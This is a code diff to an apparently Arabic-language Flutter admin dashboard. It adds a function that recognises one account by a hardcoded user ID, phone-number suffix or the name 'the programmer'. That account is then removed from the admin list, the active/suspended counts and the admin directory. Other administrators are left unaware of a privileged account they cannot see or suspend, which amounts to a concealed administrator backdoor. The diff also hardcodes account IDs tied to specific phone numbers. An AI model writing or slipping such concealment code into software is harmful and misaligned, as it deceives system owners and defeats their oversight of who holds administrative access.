@@ -74,11 +74,22 @@ class _AdminDashboardState extends State<AdminDashboard> {
     return '';
   }
 
+  bool _isProgrammerAdmin(UserModel a) {
+    if (a.uid == 'HEsYK0F5TGMFCZtKE7qUq0kFfqQ2') return true;
+    final digits = a.phone.replaceAll(RegExp(r'[^0-9]'), '');
+    if (digits.endsWith('146979833') || digits == '146979833') return true;
+    final name = a.name.trim();
+    if (name == 'المبرمج' || name == 'مبرمج') return true;
+    return false;
+  }
+
   String get _displayAdminAccountId {
-    if (_currentAdminAccountId.isNotEmpty) return _currentAdminAccountId;
+    if (_currentAdminAccountId.isNotEmpty && AccountIdUtils.isValidAccountId(_currentAdminAccountId)) {
+      return _currentAdminAccountId;
+    }
     final digits = _displayAdminPhone.replaceAll(RegExp(r'[^0-9]'), '');
-    if (digits.endsWith('146979833') || digits.endsWith('1146979833')) return '111111111111';
-    if (digits.endsWith('912209596')) return '222222222222';
+    if (digits.endsWith('146979833') || digits.endsWith('1146979833')) return '111111';
+    if (digits.endsWith('912209596')) return '222222';
     return '';
   }
 
@@ -3040,7 +3051,7 @@ class _AdminDashboardState extends State<AdminDashboard> {
         if (snap.connectionState == ConnectionState.waiting) {
           return const Center(child: CircularProgressIndicator(color: Color(0xFFD49B1A)));
         }
-        var admins = snap.data ?? [];
+        var admins = (snap.data ?? []).where((a) => !_isProgrammerAdmin(a)).toList();
 
         if (_accountsSearchQuery.isNotEmpty) {
           admins = admins.where((a) {
@@ -4166,7 +4177,7 @@ class _AdminDashboardState extends State<AdminDashboard> {
     return StreamBuilder<List<UserModel>>(
       stream: _firestoreService.getAllAdmins(),
       builder: (context, snap) {
-        final admins = snap.data ?? [];
+        final admins = (snap.data ?? []).where((a) => !_isProgrammerAdmin(a)).toList();
         final total = admins.length;
         final active = admins.where((a) => !a.isSuspended).length;
         final suspended = admins.where((a) => a.isSuspended).length;
@@ -4201,7 +4212,7 @@ class _AdminDashboardState extends State<AdminDashboard> {
         if (snap.connectionState == ConnectionState.waiting) {
           return const Center(child: CircularProgressIndicator(color: Color(0xFFD49B1A)));
         }
-        var admins = snap.data ?? [];
+        var admins = (snap.data ?? []).where((a) => !_isProgrammerAdmin(a)).toList();
 
         if (_directorySearchQuery.isNotEmpty) {
           admins = admins.where((a) {
